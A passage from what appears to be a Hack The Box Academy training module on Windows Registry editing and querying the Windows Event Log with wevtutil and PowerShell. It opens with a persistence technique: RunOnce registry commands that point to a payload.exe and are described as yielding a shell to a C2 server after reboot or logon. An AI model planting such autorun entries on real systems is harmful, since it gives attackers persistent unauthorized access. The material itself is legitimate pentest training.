PSParentPath : Microsoft.PowerShell.Core<span class="hljs-tag">\<span class="hljs-name">Registry</span></span>::HKEY_CURRENT_USER<span class="hljs-tag">\<span class="hljs-name">SOFTWARE</span></span><span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">CurrentVersion</span></span><span class="hljs-tag">\<span class="hljs-name">RunOnce</span></span>
PSChildName  : TestKey
PSDrive      : HKCU
PSProvider   : Microsoft.PowerShell.Core<span class="hljs-tag">\<span class="hljs-name">Registry</span></span>
</code></pre>
<p>After using New-ItemProperty to set our value named <code>access</code> and specifying the value as <code>C:\Users\htb-student\Downloads\payload.exe</code> we can see in the results that our value was created successfully, and the corresponding information, such as path location and Key name. Just to show that our key was created, we can see the new key and its values in the image below from the GUI Registry editor.</p>
<p><strong>TestKey Creation</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/167/testkeys.png" alt="text"></p>
<p>If we wanted to add the same key/value pair using Reg.exe, we would do so like this:</p>
<p>Code: powershell</p>
<pre><code class="lang-powershell">reg add "HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce<span class="hljs-symbol">\T</span>estKey" /v access /t REG_SZ /d "C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\D</span>ownloads<span class="hljs-symbol">\p</span>ayload.exe"
</code></pre>
<p>Now in a real pentest, we would have left an executable payload on the host, and in the instance that the host reboots or the user logs in, we would acquire a new shell to our C2. This value doesn&#39;t do much for us right now, so let&#39;s practice deleting it.</p>
<p><strong>Delete Reg properties</strong></p>
<p>Working with the Registry</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; Remove-ItemProperty -Path HKCU:<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce<span class="hljs-symbol">\T</span>estKey -Name  "access"

PS C:<span class="hljs-symbol">\h</span>tb&gt; Get-ItemProperty -Path HKCU:<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce<span class="hljs-symbol">\T</span>estKey
</code></pre>
<p>If no error window popped up, our key/value pair was deleted successfully. However, this is one of those things you should be extremely careful with. Removing entries from the Windows Registry could negatively affect the host and how it functions. Be sure you know what it is you are removing before. In the wise words of Uncle Ben, &quot;<code>With great power comes great responsibility.</code>&quot;</p>
<hr>
<h3 id="onwards">Onwards</h3>
<p>Now that we have Registry management down, it&#39;s time to move on to handling Event Logs through PowerShell.</p>
<h2 id="working-with-the-windows-event-log">Working with the Windows Event Log</h2>
<hr>
<p>From a SOC Analyst or IT Administrator&#39;s perspective, monitoring, collecting, and categorizing events occurring on all machines across the network is an invaluable source of information for defenders proactively analyzing and protecting their network from suspicious activity. On the other hand, attackers can see this as an opportunity to gain insight into the target environment, disrupt the flow of information, and as a way to hide their tracks. As we will see in later modules, sometimes we can find juicy information such as credentials hiding in event logs as a target system that we compromise during a penetration test. Other times, enumerating event logs can help us understand the level of logging in the environment (are just the defaults in place, or has the target organization configured more granular logging?). In this section, we will discuss the following:</p>
<ul>
<li>What is the Windows Event Log?</li>
<li>What information does it log, and where does it store this information?</li>
<li>Interacting with the Event Log via the <code>wevtutil</code> command line utility</li>
<li>Interacting with the Event Log using PowerShell cmdlets</li>
</ul>
<hr>
<h3 id="what-is-the-windows-event-log-">What is the Windows Event Log?</h3>
<p>A clear understanding of event logging is crucial to success in infosec. To kickstart our journey into gaining a thorough understanding of the Windows Event Log, there are a few key concepts that we need to define before diving in. These concepts will become the base upon which everything else will be built. The first one that needs to be explained is an <code>event</code> definition. Simply put, an <code>event</code> is any action or occurrence that can be identified and classified by a system&#39;s hardware or software. <code>Events</code> can be generated or triggered through a variety of different ways including some of the following:</p>
<ul>
<li>User-Generated Events<ul>
<li>Movement of a mouse, typing on a keyboard, other user-controlled peripherals, etc.</li>
</ul>
</li>
<li>Application Generated Events<ul>
<li>Application updates, crashes, memory usage/consumption, etc.</li>
</ul>
</li>
<li>System Generated Events<ul>
<li>System uptime, system updates, driver loading/unloading, user login, etc.</li>
</ul>
</li>
</ul>
<p>With so many events occurring at different intervals of time from various sources, how does a Windows system keep track of and categorize all of them? This is where our second key concept, known as <code>event logging</code> comes into play.</p>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/eventlog/event-logging">Event Logging</a> as defined by Microsoft:</p>
<p>&quot;<code>...provides a standard, centralized way for applications (and the operating system) to record important software and hardware events.</code>&quot;</p>
<p>This definition sums up the question quite nicely. However, let us attempt to break it down a bit. As we discussed beforehand, there are a lot of events that are being triggered or generated concurrently on a system. Each event will have its own source that provides the information and details behind the event in its own format. So how does it handle all of this information?</p>
<p>Windows attempts to resolve this issue by providing a standardized approach to recording, storing, and managing events and event information through a service known as the <code>Windows Event Log</code>. As its name suggests, the <code>Event Log</code> manages events and event logs, however, in addition to this functionality it also opens up a special API that allows applications to maintain and manage their own separate logs. In the <a href="https://academy.hackthebox.com/module/details/49">Windows Fundamentals</a> module, we discussed <code>services</code> in logs in greater detail in the <a href="https://academy.hackthebox.com/module/49/section/457">Windows Services and Processes</a> section, however, it is essential to understand that the <code>Event Log</code> is a required Windows service starting upon system initialization that runs in the context of another executable and not it&#39;s own.</p>
<p>Before we dig into querying the Event Log from cmd.exe and PowerShell we need to understand the possible types of events available to us, the elements of a log, and various other elements.</p>
<hr>
<h3 id="event-log-categories-and-types">Event Log Categories and Types</h3>
<p>The main four log categories include application, security, setup, and system. Another type of category also exists called <code>forwarded events</code>.</p>
<table>
<thead>
<tr>
<th>Log Category</th>
<th>Log Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>System Log</td>
<td>The system log contains events related to the Windows system and its components. A system-level event could be a service failing at startup.</td>
</tr>
<tr>
<td>Security Log</td>
<td>Self-explanatory; these include security-related events such as failed and successful logins, and file creation/deletion. These can be used to detect various types of attacks that we will cover in later modules.</td>
</tr>
<tr>
<td>Application Log</td>
<td>This stores events related to any software/application installed on the system. For example, if Slack has trouble starting it will be recorded in this log.</td>
</tr>
<tr>
<td>Setup Log</td>
<td>This log holds any events that are generated when the Windows operating system is installed. In a domain environment, events related to Active Directory will be recorded in this log on domain controller hosts.</td>
</tr>
<tr>
<td>Forwarded Events</td>
<td>Logs that are forwarded from other hosts within the same network.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="event-types">Event Types</h3>
<p>There are five types of events that can be logged on Windows systems:</p>
<table>
<thead>
<tr>
<th>Type of Event</th>
<th>Event Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Error</td>
<td>Indicates a major problem, such as a service failing to load during startup, has occurred.</td>
</tr>
<tr>
<td>Warning</td>
<td>A less significant log but one that may indicate a possible problem in the future. One example is low disk space. A Warning event will be logged to note that a problem may occur down the road. A Warning event is typically when an application can recover from the event without losing functionality or data.</td>
</tr>
<tr>
<td>Information</td>
<td>Recorded upon the successful operation of an application, driver, or service, such as when a network driver loads successfully. Typically not every desktop application will log an event each time they start, as this could lead to a considerable amount of extra &quot;noise&quot; in the logs.</td>
</tr>
<tr>
<td>Success Audit</td>
<td>Recorded when an audited security access attempt is successful, such as when a user logs on to a system.</td>
</tr>
<tr>
<td>Failure Audit</td>
<td>Recorded when an audited security access attempt fails, such as when a user attempts to log in but types their password in wrong. Many audit failure events could indicate an attack, such as Password Spraying.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="event-severity-levels">Event Severity Levels</h3>
<p>Each log can have one of five severity levels associated with it, denoted by a number:</p>
<table>
<thead>
<tr>
<th>Severity Level</th>
<th>Level #</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Verbose</td>
<td>5</td>
<td>Progress or success messages.</td>
</tr>
<tr>
<td>Information</td>
<td>4</td>
<td>An event that occurred on the system but did not cause any issues.</td>
</tr>
<tr>
<td>Warning</td>
<td>3</td>
<td>A potential problem that a sysadmin should dig into.</td>
</tr>
<tr>
<td>Error</td>
<td>2</td>
<td>An issue related to the system or service that does not require immediate attention.</td>
</tr>
<tr>
<td>Critical</td>
<td>1</td>
<td>This indicates a significant issue related to an application or a system that requires urgent attention by a sysadmin that, if not addressed, could lead to system or application instability.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="elements-of-a-windows-event-log">Elements of a Windows Event Log</h3>
<p>The Windows Event Log provides information about hardware and software events on a Windows system. All event logs are stored in a standard format and include the following elements:</p>
<ul>
<li><code>Log name</code>: As discussed above, the name of the event log where the events will be written. By default, events are logged for <code>system</code>, <code>security</code>, and <code>applications</code>.</li>
<li><code>Event date/time</code>: Date and time when the event occurred</li>
<li><code>Task Category</code>: The type of recorded event log</li>
<li><code>Event ID</code>: A unique identifier for sysadmins to identify a specific logged event</li>
<li><code>Source</code>: Where the log originated from, typically the name of a program or software application</li>
<li><code>Level</code>: Severity level of the event. This can be information, error, verbose, warning, critical</li>
<li><code>User</code>: Username of who logged onto the host when the event occurred</li>
<li><code>Computer</code>: Name of the computer where the event is logged</li>
</ul>
<p>There are many Event IDs that an organization can monitor to detect various issues. In an Active Directory environment, <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor">this list</a> includes key events that are recommended to be monitored for to look for signs of a compromise. <a href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/">This</a> searchable database of Event IDs is worth perusing to understand the depth of logging possible on a Windows system.</p>
<hr>
<h3 id="windows-event-log-technical-details">Windows Event Log Technical Details</h3>
<p>The Windows Event Log is handled by the <code>EventLog</code> services. On a Windows system, the service&#39;s display name is <code>Windows Event Log</code>, and it runs inside the service host process <a href="https://en.wikipedia.org/wiki/Svchost.exe">svchost.exe</a>. It is set to start automatically at system boot by default. It is difficult to stop the EventLog service as it has multiple dependency services. If it is stopped, it will likely cause significant system instability. By default, Windows Event Logs are stored in <code>C:\Windows\System32\winevt\logs</code> with the file extension <code>.evtx</code>.</p>
<p>Working with the Windows Event Log</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; ls C:\Windows\System32\winevt\logs

    Directory: C:\Windows\System32\winevt\logs


Mode                 LastWriteTime         Length Name
-<span class="ruby">---                 -------------         ------ ----
</span>-<span class="ruby">a----        <span class="hljs-number">11</span>/<span class="hljs-number">16</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span> PM        <span class="hljs-number">7409664</span> Application.evtx
</span>-<span class="ruby">a----         <span class="hljs-number">6</span>/<span class="hljs-number">14</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span> PM          <span class="hljs-number">69632</span> HardwareEvents.evtx
</span>-<span class="ruby">a----         <span class="hljs-number">6</span>/<span class="hljs-number">14</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span> PM          <span class="hljs-number">69632</span> Internet Explorer.evtx
</span>-<span class="ruby">a----         <span class="hljs-number">6</span>/<span class="hljs-number">14</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">20</span> PM          <span class="hljs-number">69632</span> Key Management Service.evtx        
</span>-<span class="ruby">a----         <span class="hljs-number">8</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">01</span> PM          <span class="hljs-number">69632</span> Microsoft-Client-License-Flexible-P
</span>                                                  latform%4Admin.evtx
-<span class="ruby">a----        <span class="hljs-number">11</span>/<span class="hljs-number">16</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">19</span> PM        <span class="hljs-number">1052672</span> Microsoft-Client-Licensing-Platform
</span><span class="hljs-tag">                                                  %<span class="hljs-selector-tag">4Admin</span><span class="hljs-selector-class">.evtx</span></span>


&lt;SNIP&gt;
</code></pre>
<p>We can interact with the Windows Event log using the <a href="https://en.wikipedia.org/wiki/Event\_Viewer">Windows Event Viewer</a> GUI application via the command line utility <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil">wevtutil</a>, or using the <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.3">Get-WinEvent</a> PowerShell cmdlet. Both <code>wevtutil</code> and <code>Get-WinEvent</code> can be used to query Event Logs on both local and remote Windows systems via cmd.exe or PowerShell.</p>
<hr>
<h3 id="interacting-with-the-windows-event-log-wevtutil">Interacting with the Windows Event Log - wevtutil</h3>
<p>The <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil">wevtutil</a> command line utility can be used to retrieve information about event logs. It can also be used to export, archive, and clear logs, among other commands.</p>
<p><strong>Wevtutil without Parameters</strong></p>
<p>Working with the Windows Event Log</p>
<pre><code class="lang-cmd-session">C:\htb&gt; wevtutil /?

Windows Events Command Line Utility.

Enables you <span class="hljs-built_in">to</span> retrieve information about event logs <span class="hljs-keyword">and</span> publishers, install
<span class="hljs-keyword">and</span> uninstall event manifests, run queries, <span class="hljs-keyword">and</span> export, archive, <span class="hljs-keyword">and</span> <span class="hljs-built_in">clear</span> logs.

Usage:

You can use either <span class="hljs-keyword">the</span> <span class="hljs-keyword">short</span> (<span class="hljs-keyword">for</span> example, ep /uni) <span class="hljs-keyword">or</span> <span class="hljs-keyword">long</span> (<span class="hljs-keyword">for</span> example,
enum-publishers /unicode) <span class="hljs-built_in">version</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">command</span> <span class="hljs-title">and</span> <span class="hljs-title">option</span> <span class="hljs-title">names</span>. <span class="hljs-title">Commands</span>,
options <span class="hljs-keyword">and</span> option values are <span class="hljs-keyword">not</span> <span class="hljs-keyword">case</span>-sensitive.

Variables are noted <span class="hljs-keyword">in</span> all <span class="hljs-built_in">upper</span>-<span class="hljs-keyword">case</span>.

wevtutil COMMAND [ARGUMENT [ARGUMENT] ...] [/OPTION:VALUE [/OPTION:VALUE] ...]

Commands:

el | enum-logs          List <span class="hljs-built_in">log</span> names.
gl | <span class="hljs-built_in">get</span>-<span class="hljs-built_in">log</span>            Get <span class="hljs-built_in">log</span> configuration information.
sl | <span class="hljs-built_in">set</span>-<span class="hljs-built_in">log</span>            Modify configuration <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">log</span>.
ep | enum-publishers    List event publishers.
gp | <span class="hljs-built_in">get</span>-publisher      Get publisher configuration information.
im | install-manifest   Install event publishers <span class="hljs-keyword">and</span> logs <span class="hljs-built_in">from</span> manifest.
um | uninstall-manifest Uninstall event publishers <span class="hljs-keyword">and</span> logs <span class="hljs-built_in">from</span> manifest.
qe | query-events       Query events <span class="hljs-built_in">from</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">log</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">log</span> <span class="hljs-built_in">file</span>.
gli | <span class="hljs-built_in">get</span>-<span class="hljs-built_in">log</span>-info      Get <span class="hljs-built_in">log</span> status information.
epl | export-<span class="hljs-built_in">log</span>        Export <span class="hljs-keyword">a</span> <span class="hljs-built_in">log</span>.
al | archive-<span class="hljs-built_in">log</span>        Archive <span class="hljs-keyword">an</span> exported <span class="hljs-built_in">log</span>.
cl | <span class="hljs-built_in">clear</span>-<span class="hljs-built_in">log</span>          Clear <span class="hljs-keyword">a</span> <span class="hljs-built_in">log</span>.

&lt;SNIP&gt;
</code></pre>
<p>We can use the <code>el</code> parameter to enumerate the names of all logs present on a Windows system.</p>
<p><strong>Enumerating Log Sources</strong></p>
<p>Working with the Windows Event Log</p>
<pre><code class="lang-cmd-session"><span class="hljs-keyword">C</span>:\htb&gt; wevtutil el

AMSI/<span class="hljs-keyword">Debug</span>
AirSpaceChannel
<span class="hljs-keyword">Analytic</span>
Application
DirectShowFilterGraph
DirectShowPluginControl
Els_Hyphenation/<span class="hljs-keyword">Analytic</span>
EndpointMapper
FirstUXPerf-<span class="hljs-keyword">Analytic</span>
ForwardedEvents
<span class="hljs-keyword">General</span> Logging
HardwareEvents

&lt;SNIP&gt;
</code></pre>
<p>With the <code>gl</code> parameter, we can display configuration information for a specific log, notably whether the log is enabled or not, the maximum size, permissions, and where the log is stored on the system.</p>
<p><strong>Gathering Log Information</strong></p>
<p>Working with the Windows Event Log</p>
<pre><code class="lang-cmd-session">C:\htb&gt; wevtutil gl "Windows PowerShell"

name: Windows PowerShell
enabled: true
type: Admin
owningPublisher:
isolation: Application
channelAccess: O:BAG:SYD:(A;;0x2;;;S<span class="hljs-string">-1</span><span class="hljs-string">-15</span><span class="hljs-string">-2</span><span class="hljs-string">-1</span>)(A;;0x2;;;S<span class="hljs-string">-1</span><span class="hljs-string">-15</span><span class="hljs-string">-3</span><span class="hljs-string">-1024</span><span class="hljs-string">-3153509613</span><span class="hljs-string">-960666767</span><span class="hljs-string">-3724611135</span><span class="hljs-string">-2725662640</span><span class="hljs-string">-12138253</span><span class="hljs-string">-543910227</span><span class="hljs-string">-1950414635</span><span class="hljs-string">-4190290187</span>)(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x7;;;SO)(A;;0x3;;;IU)(A;;0x3;;;SU)(A;;0x3;;;S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-3</span>)(A;;0x3;;;S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-33</span>)(A;;0x1;;;S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-32</span><span class="hljs-string">-573</span>)
logging:
  logFileName: %SystemRoot%\System32\Winevt\Logs\Windows PowerShell.evtx
  retention: false
  autoBackup: false
  maxSize: 15728640
publishing:
  fileMax: 1
</code></pre>
<p>The <code>gli</code> parameter will give us specific status information about the log or log file, such as the creation time, last access and write times, file size, number of log records, and more.</p>
<p>Working with the Windows Event Log</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\htb&gt; wevtutil gli <span class="hljs-string">"Windows PowerShell"</span>

<span class="hljs-attribute">creationTime</span>: <span class="hljs-number">2020</span><span class="hljs-attribute">-10-06T16</span>:<span class="hljs-number">57</span>:<span class="hljs-number">38.617</span>Z
<span class="hljs-attribute">lastAccessTime</span>: <span class="hljs-number">2022</span><span class="hljs-attribute">-10-26T19</span>:<span class="hljs-number">05</span>:<span class="hljs-number">21.533</span>Z
<span class="hljs-attribute">lastWriteTime</span>: <span class="hljs-number">2022</span><span class="hljs-attribute">-10-26T19</span>:<span class="hljs-number">05</span>:<span class="hljs-number">21.533</span>Z
<span class="hljs-attribute">fileSize</span>: <span class="hljs-number">11603968</span>
<span class="hljs-attribute">attributes</span>: <span class="hljs-number">32</span>
<span class="hljs-attribute">numberOfLogRecords</span>: <span class="hljs-number">9496</span>
<span class="hljs-attribute">oldestRecordNumber</span>: <span class="hljs-number">1</span>
</code></pre>
<p>There are many ways we can query for events. For example, let&#39;s say we want to display the last 5 most recent events from the Security log in text format. Local admin access is needed for this command.</p>
<p><strong>Querying Events</strong></p>
<p>Working with the Windows Event Log</p>
<pre><code class="lang-cmd-session"><span class="hljs-string">C:</span>\htb&gt; wevtutil qe Security <span class="hljs-regexp">/c:5 /</span><span class="hljs-string">rd:</span><span class="hljs-literal">true</span> /<span class="hljs-string">f:</span>text

Event[<span class="hljs-number">0</span>]
  Log <span class="hljs-string">Name:</span> Security
<span class="hljs-symbol">  Source:</span> Microsoft-Windows-Security-Auditing
<span class="hljs-symbol">  Date:</span> <span class="hljs-number">2022</span><span class="hljs-number">-11</span><span class="hljs-number">-16</span><span class="hljs-string">T14:</span><span class="hljs-number">54</span>:<span class="hljs-number">13.2270000</span>Z
  Event <span class="hljs-string">ID:</span> <span class="hljs-number">4799</span>
<span class="hljs-symbol">  Task:</span> Security Group Management
<span class="hljs-symbol">  Level:</span> Information
<span class="hljs-symbol">  Opcode:</span> Info
<span class="hljs-symbol">  Keyword:</span> Audit Success
<span class="hljs-symbol">  User:</span> N/A
  User <span class="hljs-string">Name:</span> N/A
<span class="hljs-symbol">  Computer:</span> ICL-WIN11.greenhorn.corp
<span class="hljs-symbol">  Description:</span> 
A security-enabled local group membership was enumerated.
<span class="hljs-symbol">
Subject:</span>
        Security <span class="hljs-string">ID:</span>            S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-18</span>
        Account <span class="hljs-string">Name:</span>           ICL-WIN11$
        Account <span class="hljs-string">Domain:</span>         GREENHORN
        Logon <span class="hljs-string">ID:</span>               <span class="hljs-number">0x3E7</span>
<span class="hljs-symbol">
Group:</span>
        Security <span class="hljs-string">ID:</span>            S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-32</span><span class="hljs-number">-544</span>
        Group <span class="hljs-string">Name:</span>             Administrators
        Group <span class="hljs-string">Domain:</span>           Builtin

Process <span class="hljs-string">Information:</span>
        Process <span class="hljs-string">ID:</span>             <span class="hljs-number">0x56c</span>
        Process <span class="hljs-string">Name:</span>           <span class="hljs-string">C:</span>\Windows\System32\svchost.exe

Event[<span class="hljs-number">1</span>]
  Log <span class="hljs-string">Name:</span> Security
<span class="hljs-symbol">  Source:</span> Microsoft-Windows-Security-Auditing
<span class="hljs-symbol">  Date:</span> <span class="hljs-number">2022</span><span class="hljs-number">-11</span><span class="hljs-number">-16</span><span class="hljs-string">T14:</span><span class="hljs-number">54</span>:<span class="hljs-number">13.0160000</span>Z
  Event <span class="hljs-string">ID:</span> <span class="hljs-number">4672</span>
<span class="hljs-symbol">  Task:</span> Special Logon
<span class="hljs-symbol">  Level:</span> Information
<span class="hljs-symbol">  Opcode:</span> Info
<span class="hljs-symbol">  Keyword:</span> Audit Success
<span class="hljs-symbol">  User:</span> N/A
  User <span class="hljs-string">Name:</span> N/A
<span class="hljs-symbol">  Computer:</span> ICL-WIN11.greenhorn.corp
<span class="hljs-symbol">  Description:</span>
Special privileges assigned to <span class="hljs-keyword">new</span> logon.
<span class="hljs-symbol">
Subject:</span>
        Security <span class="hljs-string">ID:</span>            S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-4125911421</span><span class="hljs-number">-2584895310</span><span class="hljs-number">-3954972028</span><span class="hljs-number">-1001</span>        
        Account <span class="hljs-string">Name:</span>           htb-student
        Account <span class="hljs-string">Domain:</span>         ICL-WIN11
        Logon <span class="hljs-string">ID:</span>               <span class="hljs-number">0x8F211</span>
<span class="hljs-symbol">
Privileges:</span>             SeSecurityPrivilege
                        SeTakeOwnershipPrivilege
                        SeLoadDriverPrivilege
                        SeBackupPrivilege
                        SeRestorePrivilege
                        SeDebugPrivilege
                        SeSystemEnvironmentPrivilege
                        SeImpersonatePrivilege
                        SeDelegateSessionUserImpersonatePrivilege

Event[<span class="hljs-number">2</span>]
  Log <span class="hljs-string">Name:</span> Security
<span class="hljs-symbol">  Source:</span> Microsoft-Windows-Security-Auditing
<span class="hljs-symbol">  Date:</span> <span class="hljs-number">2022</span><span class="hljs-number">-11</span><span class="hljs-number">-16</span><span class="hljs-string">T14:</span><span class="hljs-number">54</span>:<span class="hljs-number">13.0160000</span>Z
  Event <span class="hljs-string">ID:</span> <span class="hljs-number">4624</span>
<span class="hljs-symbol">  Task:</span> Logon
<span class="hljs-symbol">  Level:</span> Information
<span class="hljs-symbol">  Opcode:</span> Info
<span class="hljs-symbol">  Keyword:</span> Audit Success
<span class="hljs-symbol">  User:</span> N/A
  User <span class="hljs-string">Name:</span> N/A
<span class="hljs-symbol">  Computer:</span> ICL-WIN11.greenhorn.corp
<span class="hljs-symbol">  Description:</span>
An account was successfully logged on.
<span class="hljs-symbol">
Subject:</span>
        Security <span class="hljs-string">ID:</span>            S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-18</span>
        Account <span class="hljs-string">Name:</span>           ICL-WIN11$
        Account <span class="hljs-string">Domain:</span>         GREENHORN
        Logon <span class="hljs-string">ID:</span>               <span class="hljs-number">0x3E7</span>


&lt;SNIP&gt;
</code></pre>
<p>We can also export events from a specific log for offline processing. Local admin is also needed to perform this export.</p>
<p><strong>Exporting Events</strong></p>
<p>Working with the Windows Event Log</p>
<pre><code class="lang-cmd-session"><span class="hljs-string">C:</span>\htb&gt; wevtutil epl System <span class="hljs-string">C:</span>\system_export.evtx
</code></pre>
<hr>
<h3 id="interacting-with-the-windows-event-log-powershell">Interacting with the Windows Event Log - PowerShell</h3>
<p>Similarly, we can interact with Windows Event Logs using the <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.3">Get-WinEvent</a> PowerShell cmdlet. Like with the <code>wevtutil</code> examples, some commands require local admin-level access.</p>
<p>To start, we can list all logs on the computer, giving us the number of records in each log.</p>
<p><strong>PowerShell - Listing All Logs</strong></p>
<p>Working with the Windows Event Log</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-WinEvent -ListLog *

LogMode   MaximumSizeInBytes RecordCount LogName
-------   ------------------ ----------- -------
Circular            <span class="hljs-number">15728640</span>         <span class="hljs-number">657</span> Windows PowerShell
Circular            <span class="hljs-number">20971520</span>       <span class="hljs-number">10713</span> System
Circular            <span class="hljs-number">20971520</span>       <span class="hljs-number">26060</span> Security
Circular            <span class="hljs-number">20971520</span>           <span class="hljs-number">0</span> Key Management Service
Circular             <span class="hljs-number">1052672</span>           <span class="hljs-number">0</span> Internet Explorer
Circular            <span class="hljs-number">20971520</span>           <span class="hljs-number">0</span> HardwareEvents
Circular            <span class="hljs-number">20971520</span>        <span class="hljs-number">6202</span> Application
Circular             <span class="hljs-number">1052672</span>             Windows Networking Vpn Plugin Platform/Op...
Circular             <span class="hljs-number">1052672</span>             Windows Networking Vpn Plugin Platform/Op... 
Circular             <span class="hljs-number">1052672</span>           <span class="hljs-number">0</span> SMSApi
Circular             <span class="hljs-number">1052672</span>          <span class="hljs-number">61</span> Setup
Circular            <span class="hljs-number">15728640</span>          <span class="hljs-number">24</span> PowerShellCore/Operational
Circular             <span class="hljs-number">1052672</span>          <span class="hljs-number">99</span> OpenSSH/Operational
Circular             <span class="hljs-number">1052672</span>          <span class="hljs-number">46</span> OpenSSH/Admin

&lt;SNIP&gt;
</code></pre>
<p>We can also list information about a specific log. Here we can see the size of the <code>Security</code> log.</p>
<p><strong>Security Log Details</strong></p>
<p>Working with the Windows Event Log</p>
<pre><code class="lang-powershell-session"><span class="hljs-comment">PS</span> <span class="hljs-comment">C:\htb</span>&gt; <span class="hljs-comment">Get</span><span class="hljs-literal">-</span><span class="hljs-comment">WinEvent</span> <span class="hljs-literal">-</span><span class="hljs-comment">ListLog</span> <span class="hljs-comment">Security</span>

<span class="hljs-comment">LogMode</span>   <span class="hljs-comment">MaximumSizeInBytes</span> <span class="hljs-comment">RecordCount</span> <span class="hljs-comment">LogName</span>
<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>   <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>
<span class="hljs-comment">Circular</span>            <span class="hljs-comment">20971520</span>       <span class="hljs-comment">26060</span> <span class="hljs-comment">Security</span>
</code></pre>
<p>We can query for the last X number of events, looking specifically for the last five events using the <code>-MaxEvents</code> parameter. Here we will list the last five events recorded in the Security log. By default, the newest logs are listed first. If we want to get older logs first, we can reverse the order to list the oldest ones first using the <code>-Oldest</code> parameter.</p>
<p><strong>Querying Last Five Events</strong></p>
<p>Working with the Windows Event Log</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-WinEvent -LogName <span class="hljs-string">'Security'</span> -MaxEvents <span class="hljs-number">5</span> | <span class="hljs-keyword">Select</span>-Object -ExpandProperty Message

An account was logged off.

Subject:
        Security ID:            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">111</span>-<span class="hljs-number">3847866527</span>-<span class="hljs-number">469524349</span>-<span class="hljs-number">687026318</span>-<span class="hljs-number">516638107</span>-<span class="hljs-number">1125189541</span>-<span class="hljs-number">6052</span>
        Account Name:           sshd_6052
        Account Domain:         <span class="hljs-keyword">VIRTUAL</span> USERS
